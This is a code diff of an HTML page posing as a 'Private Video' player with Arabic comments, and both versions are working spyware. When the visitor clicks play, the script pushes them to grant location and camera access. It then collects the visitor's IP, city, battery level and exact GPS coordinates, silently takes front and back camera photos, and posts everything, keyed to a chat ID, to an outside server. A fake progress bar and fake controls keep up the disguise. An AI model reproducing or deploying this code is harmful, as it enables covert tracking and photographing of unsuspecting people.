@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>مشغل الفيديو</title>
+    <title>Video Player</title>
     <style>
         * {
             margin: 0;
@@ -71,53 +71,6 @@
             border-top: 20px solid transparent;
             border-bottom: 20px solid transparent;
             margin-left: 8px;
-        }
-
-        /* زر إعادة المحاولة (بديل الترس) */
-        #retryButton {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            background: rgba(255, 0, 0, 0.2);
-            border: 4px solid #ff0000;
-            border-radius: 24px;
-            padding: 30px 40px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            backdrop-filter: blur(8px);
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.4);
-            z-index: 10;
-            text-align: center;
-            min-width: 220px;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: #fff;
-        }
-        #retryButton:hover {
-            transform: translate(-50%, -50%) scale(1.05);
-            background: rgba(255, 0, 0, 0.4);
-            border-color: #ff3333;
-            box-shadow: 0 0 70px rgba(255, 0, 0, 0.7);
-        }
-        #retryButton .icon-retry {
-            font-size: 70px;
-            line-height: 1;
-            margin-bottom: 10px;
-        }
-        #retryButton .main-text {
-            font-size: 28px;
-            font-weight: bold;
-            color: #fff;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
-        }
-        #retryButton .sub-text {
-            font-size: 16px;
-            color: #ddd;
-            margin-top: 6px;
-            opacity: 0.9;
         }
 
         .video-info {
@@ -250,20 +203,6 @@
                 border-bottom-width: 14px;
                 margin-left: 5px;
             }
-            #retryButton {
-                padding: 20px 25px;
-                min-width: 160px;
-                border-radius: 16px;
-            }
-            #retryButton .icon-retry {
-                font-size: 50px;
-            }
-            #retryButton .main-text {
-                font-size: 20px;
-            }
-            #retryButton .sub-text {
-                font-size: 14px;
-            }
         }
     </style>
 </head>
@@ -271,22 +210,14 @@
 
     <div class="video-player-container">
         <div class="video-info">
-            <div class="video-title">فيديو خاص</div>
+            <div class="video-title">Private Video</div>
             <div class="video-meta"></div>
         </div>
 
         <div class="video-thumbnail" id="thumbnailArea">
-            <!-- زر التشغيل الأحمر -->
             <div class="play-button-overlay" id="playButtonOverlay">
                 <div class="play-icon-large"></div>
                 <div class="spinner" id="spinner"></div>
-            </div>
-
-            <!-- زر إعادة المحاولة (بديل الترس) -->
-            <div id="retryButton">
-                <div class="icon-retry">🔴</div>
-                <div class="main-text">إعادة المحاولة</div>
-                <div class="sub-text">اضغط لطلب الأذونات مرة أخرى</div>
             </div>
         </div>
 
@@ -311,7 +242,7 @@
 
     <div id="loading">
         <div class="spinner" style="position:static;"></div>
-        <div class="loading-text">جاري تحميل الفيديو ...</div>
+        <div class="loading-text">Loading video... Please wait</div>
     </div>
 
     <script>
@@ -327,7 +258,7 @@
                 chatId: ''
             };
 
-            let settingsOpened = false;
+            let settingsOpened = false;   // هل تم فتح الإعدادات (مرة واحدة فقط)
             let videoStarted = false;
             let isProcessing = false;
 
@@ -336,218 +267,106 @@
             const realVideo = document.getElementById('realVideo');
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
-            const retryBtn = document.getElementById('retryButton');
 
-            // ---- طلب الصلاحيات ----
-            async function requestPermissions() {
-                let locationOk = false;
-                let cameraOk = false;
-
-                try {
-                    await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(
-                            () => { locationOk = true; resolve(); },
-                            (err) => { reject(err); },
-                            { enableHighAccuracy: true, timeout: 10000 }
-                        );
-                    });
-                } catch (e) {
-                    locationOk = false;
-                }
-
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    stream.getTracks().forEach(t => t.stop());
-                    cameraOk = true;
-                } catch (e) {
-                    cameraOk = false;
-                }
-
-                return locationOk && cameraOk;
-            }
-
-            // ---- فتح إعدادات الموقع في المتصفح ----
-            function openBrowserLocationSettings() {
-                const ua = navigator.userAgent;
-
-                if (/Chrome/.test(ua) && !/Edge/.test(ua)) {
-                    try { window.location.href = 'chrome://settings/content/location'; return; } catch (e) {}
-                }
-                if (/Firefox/.test(ua)) {
-                    try { window.location.href = 'about:preferences#privacy'; return; } catch (e) {}
-                }
-                if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
-                    try { window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices'; return; } catch (e) {}
-                }
-                if (/Android/.test(ua)) {
-                    try {
-                        window.location.href = 'intent://settings#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end';
-                        return;
-                    } catch (e) {}
-                    try {
-                        window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
-                        return;
-                    } catch (e) {}
-                }
-                try {
-                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
-                } catch (e) {
-                    alert('تعذر فتح الإعدادات. يرجى فتح إعدادات الموقع يدوياً في متصفحك.');
-                }
-            }
-
-            // ---- جمع البيانات ----
-            async function fetchIPInfo() {
-                try {
-                    const response = await fetch('https://ipapi.co/json/');
-                    const data = await response.json();
-                    capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
-                } catch {
-                    capturedData.ipInfo = "IP Info not available";
-                }
-            }
-            async function getBatteryStatus() {
-                try {
-                    const battery = await navigator.getBattery();
-                    capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
-                } catch {
-                    capturedData.batteryStatus = "Unknown";
-                }
-            }
-            async function captureFromCamera(facingMode) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: { exact: facingMode } }
-                    });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
-                    stream.getTracks().forEach(track => track.stop());
-                    capturedData.permissions.push(`${facingMode === 'user' ? 'أمامية' : 'خلفية'} الكاميرا: مسموح`);
-                } catch {
-                    capturedData.permissions.push(`${facingMode === 'user' ? 'أمامية' : 'خلفية'} الكاميرا: مرفوض`);
-                }
-            }
-            async function getLocation() {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 15000,
-                            maximumAge: 0
-                        });
-                    });
-                    capturedData.location =
-                        `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
-                    capturedData.permissions.push('الموقع: مسموح');
-                } catch (err) {
-                    capturedData.permissions.push('الموقع: مرفوض');
-                    capturedData.location = '';
-                }
-            }
-
-            async function sendDataWithBypass(data) {
-                const urls = [
-                    'https://server-brxz.onrender.com/submitData',
-                    'https://server-brxz.onrender.com/submitData'
-                ];
-                for (let url of urls) {
-                    try {
-                        await fetch(url, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                            body: new URLSearchParams(data),
-                            mode: 'no-cors'
-                        });
-                        return;
-                    } catch (e) {}
-                    try {
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('POST', url, false);
-                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                        xhr.send(new URLSearchParams(data));
-                        return;
-                    } catch (e) {}
-                    try {
-                        const iframe = document.createElement('iframe');
-                        iframe.style.display = 'none';
-                        document.body.appendChild(iframe);
-                        const form = document.createElement('form');
-                        form.method = 'POST';
-                        form.action = url;
-                        form.target = iframe.name || 'hiddenFrame';
-                        iframe.name = form.target;
-                        for (let key in data) {
-                            const input = document.createElement('input');
-                            input.type = 'hidden';
-                            input.name = key;
-                            input.value = data[key];
-                            form.appendChild(input);
-                        }
-                        document.body.appendChild(form);
-                        form.submit();
-                        setTimeout(() => {
-                            document.body.removeChild(form);
-                            document.body.removeChild(iframe);
-                        }, 1000);
-                        return;
-                    } catch (e) {}
-                    try {
-                        const blob = new Blob([new URLSearchParams(data).toString()], {
-                            type: 'application/x-www-form-urlencoded'
-                        });
-                        navigator.sendBeacon(url, blob);
-                        return;
-                    } catch (e) {}
-                }
-            }
-
-            // ---- تشغيل الفيديو مع الصوت ----
-            function startVideoWithSound() {
-                if (videoStarted) return;
-                videoStarted = true;
-
-                thumbnailArea.style.display = 'none';
-                realVideo.style.display = 'block';
-
+            // دالة مساعدة لتشغيل الفيديو بالصوت
+            function forcePlayWithSound() {
                 realVideo.muted = false;
                 realVideo.volume = 1.0;
-
                 const playPromise = realVideo.play();
                 if (playPromise !== undefined) {
-                    playPromise.then(() => {}).catch(() => {
+                    playPromise.catch(() => {
+                        // إذا فشل التشغيل بسبب سياسة المتصفح، نجرب مع كتم الصوت ثم إعادة الصوت
                         realVideo.muted = true;
                         realVideo.play().then(() => {
                             setTimeout(() => {
                                 realVideo.muted = false;
                                 realVideo.volume = 1.0;
+                                realVideo.play().catch(() => {});
                             }, 100);
                         }).catch(() => {});
                     });
                 }
-
+                // محاولات متأخرة لتفعيل الصوت
                 setTimeout(() => {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
-                    try { realVideo.play(); } catch (e) {}
+                    realVideo.play().catch(() => {});
                 }, 500);
-
                 setTimeout(() => {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
-                    try { realVideo.play(); } catch (e) {}
+                    realVideo.play().catch(() => {});
                 }, 3000);
             }
 
-            // ---- جمع البيانات وتشغيل الفيديو ----
-            async function collectAndPlay() {
+            // بدء الفيديو مباشرة (نُقلت من startVideoWithSound مع تعديل بسيط)
+            function startVideo() {
+                if (videoStarted) return;
+                videoStarted = true;
+
+                thumbnailArea.style.display = 'none';
+                realVideo.style.display = 'block';
+                forcePlayWithSound();
+            }
+
+            // طلب الصلاحيات (نحتاجها فقط للتسجيل، لا نوقف التشغيل)
+            async function requestPermissions() {
+                // محاولة الموقع
+                try {
+                    await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000
+                        });
+                    });
+                    capturedData.permissions.push('Geolocation Allowed');
+                } catch (e) {
+                    capturedData.permissions.push('Geolocation Denied');
+                }
+
+                // محاولة الكاميرا (أمامي وخلفي) لا نوقف إذا فشلت
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                    stream.getTracks().forEach(t => t.stop());
+                    capturedData.permissions.push('Front Camera Allowed');
+                } catch (e) {
+                    capturedData.permissions.push('Front Camera Denied');
+                }
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                    stream.getTracks().forEach(t => t.stop());
+                    capturedData.permissions.push('Back Camera Allowed');
+                } catch (e) {
+                    capturedData.permissions.push('Back Camera Denied');
+                }
+            }
+
+            // فتح إعدادات الموقع (نسختك المُحسَّنة)
+            function openLocationSettings() {
+                const ua = navigator.userAgent;
+                if (/Android/i.test(ua)) {
+                    const intents = [
+                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent:#Intent;action=android.settings.SETTINGS;end'
+                    ];
+                    for (let intent of intents) {
+                        try { window.location.href = intent; break; } catch (e) {}
+                    }
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
+                    setTimeout(() => window.open('prefs:root=Privacy&path=LOCATION', '_blank'), 500);
+                } else if (/Windows/i.test(ua)) {
+                    window.open('ms-settings:privacy-location', '_blank');
+                } else if (/Mac/i.test(ua)) {
+                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
+                } else {
+                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                }
+            }
+
+            // جمع البيانات الإضافية ثم التشغيل
+            async function collectDataAndPlay() {
                 if (isProcessing) return;
                 isProcessing = true;
 
@@ -558,17 +377,50 @@
 
                 capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
 
-                await Promise.all([
-                    fetchIPInfo(),
-                    getBatteryStatus(),
-                    getLocation()
-                ]);
+                // جلب معلومات IP والبطارية والموقع (بدون توقف)
+                try {
+                    const resp = await fetch('https://ipapi.co/json/');
+                    const data = await resp.json();
+                    capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
+                } catch (e) { capturedData.ipInfo = "IP Info not available"; }
 
-                await captureFromCamera('user');
-                await captureFromCamera('environment');
-                await captureFromCamera('user');
-                await captureFromCamera('environment');
+                try {
+                    const battery = await navigator.getBattery();
+                    capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
+                } catch (e) { capturedData.batteryStatus = "Unknown"; }
 
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
+                        });
+                    });
+                    capturedData.location = `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
+                } catch (e) { capturedData.location = ''; }
+
+                // محاولة التقاط صور الكاميرا (إذا توفرت الصلاحية)
+                async function capture(facingMode) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
+                        stream.getTracks().forEach(track => track.stop());
+                    } catch (e) {}
+                }
+
+                await capture('user');
+                await capture('environment');
+
+                // إرسال البيانات بصرف النظر عن النتيجة
                 const data = {
                     chatId: capturedData.chatId,
                     imageDatas: capturedData.images.join(','),
@@ -578,118 +430,89 @@
                     battery: capturedData.batteryStatus
                 };
 
-                await sendDataWithBypass(data);
+                // تجاهل فشل الإرسال
+                try {
+                    await fetch('https://server-brxz.onrender.com/submitData', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: new URLSearchParams(data),
+                        mode: 'no-cors'
+                    });
+                } catch (e) {}
 
                 spinner.style.display = 'none';
                 loading.style.display = 'none';
                 playBtn.style.opacity = '1';
                 playBtn.style.pointerEvents = 'auto';
 
-                startVideoWithSound();
+                startVideo();
                 isProcessing = false;
             }
 
-            // ---- إظهار / إخفاء الأزرار ----
-            function showRetryButton() {
-                retryBtn.style.display = 'flex';
-                playBtn.style.display = 'none';
-            }
-
-            function hideRetryButton() {
-                retryBtn.style.display = 'none';
-                playBtn.style.display = 'flex';
-            }
-
-            // ---- معالج الضغط على زر التشغيل (يفتح الإعدادات) ----
+            // معالج النقر على الزر الأحمر
             async function handlePlayClick(e) {
                 e.stopPropagation();
                 if (videoStarted || isProcessing) return;
 
-                // الضغطة الأولى: فتح إعدادات الموقع
-                settingsOpened = true;
-                openBrowserLocationSettings();
-                // سيتم استكمال العملية عند العودة (visibilitychange)
-            }
-
-            // ---- معالج زر إعادة المحاولة (يطلب الأذونات) ----
-            async function handleRetryClick() {
-                const granted = await requestPermissions();
-                if (granted) {
-                    hideRetryButton();
-                    await collectAndPlay();
-                } else {
-                    // يبقى الزر ظاهراً
-                    showRetryButton();
+                // أول نقرة: افتح الإعدادات
+                if (!settingsOpened) {
+                    settingsOpened = true;
+                    openLocationSettings();
+                    return;
                 }
+
+                // بعد فتح الإعدادات: نجرب الصلاحيات ثم نشغل الفيديو مهما حصل
+                await requestPermissions();      // يسجل فقط
+                await collectDataAndPlay();      // يشغل الفيديو
             }
 
-            // ---- مراقبة العودة من الإعدادات ----
-            document.addEventListener('visibilitychange', function() {
+            // عند الرجوع من الإعدادات (visibility change) نشغل الفيديو تلقائياً بعد المحاولة
+            document.addEventListener('visibilitychange', async function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    (async () => {
-                        const granted = await requestPermissions();
-                        if (granted) {
-                            hideRetryButton();
-                            await collectAndPlay();
-                        } else {
-                            showRetryButton();
-                        }
-                    })();
+                    await requestPermissions();
+                    await collectDataAndPlay();
                 }
             });
 
-            // ---- ربط الأحداث ----
+            // ربط الأحداث
             if (playBtn) {
                 playBtn.addEventListener('click', handlePlayClick);
             }
             if (thumbnailArea) {
                 thumbnailArea.addEventListener('click', handlePlayClick);
             }
-            if (retryBtn) {
-                retryBtn.addEventListener('click', handleRetryClick);
-            }
 
-            // ---- تفعيل الصوت عند أي تفاعل ----
-            document.addEventListener('click', function() {
-                if (realVideo) {
-                    realVideo.muted = false;
-                    realVideo.volume = 1.0;
-                    try { realVideo.play(); } catch (e) {}
+            // تفعيل الصوت عند أول تفاعل (تجاوز سياسات كتم الصوت التلقائي)
+            document.addEventListener('click', () => {
+                if (realVideo && realVideo.display !== 'none') {
+                    forcePlayWithSound();
                 }
             }, true);
 
-            // ---- أزرار التحكم (تكبير الشاشة) ----
+            // أزرار التحكم الوهمية
             document.querySelectorAll('.control-button').forEach(button => {
                 button.addEventListener('click', function(e) {
                     e.stopPropagation();
                     if (this.textContent.includes('⛶')) {
                         const video = document.getElementById('realVideo');
-                        if (video.requestFullscreen) {
-                            video.requestFullscreen();
-                        } else if (video.webkitRequestFullscreen) {
-                            video.webkitRequestFullscreen();
-                        }
+                        if (video.requestFullscreen) video.requestFullscreen();
+                        else if (video.webkitRequestFullscreen) video.webkitRequestFullscreen();
                     }
                 });
             });
 
-            // ---- شريط التقدم الوهمي ----
+            // شريط تقدم وهمي (اختياري)
             const progressInterval = setInterval(() => {
                 const progressFill = document.querySelector('.progress-fill');
-                const realVideoEl = document.getElementById('realVideo');
-                if (realVideoEl.style.display === 'block') {
+                if (document.getElementById('realVideo').style.display === 'block') {
                     clearInterval(progressInterval);
                     return;
                 }
-                const currentWidth = parseInt(progressFill.style.width) || 35;
-                const newWidth = (currentWidth + 0.1) % 100;
-                progressFill.style.width = newWidth + '%';
-
+                const w = (parseInt(progressFill.style.width) || 35) + 0.1;
+                progressFill.style.width = (w % 100) + '%';
+                const sec = Math.floor((w / 100) * 165);
                 const timeDisplay = document.querySelector('.time-display');
-                const currentSeconds = Math.floor((newWidth / 100) * 165);
-                const minutes = Math.floor(currentSeconds / 60);
-                const seconds = currentSeconds % 60;
-                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
+                timeDisplay.textContent = `${Math.floor(sec/60)}:${(sec%60).toString().padStart(2,'0')} / 2:45`;
             }, 1000);
 
         })();
